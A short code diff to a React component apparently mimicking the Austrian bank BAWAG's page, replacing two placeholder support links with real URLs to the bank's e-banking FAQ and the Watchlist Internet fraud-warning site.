@@ -238,8 +238,8 @@ const Bawag = () => {
                 <div className="p-3">
                   <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                   <ul className="space-y-1">
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
-                    <li><a href="#" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
+                    <li><a href="https://www.bawag.at/bawag/faq#ebanking" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
+                    <li><a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                   </ul>
                 </div>
               </div>
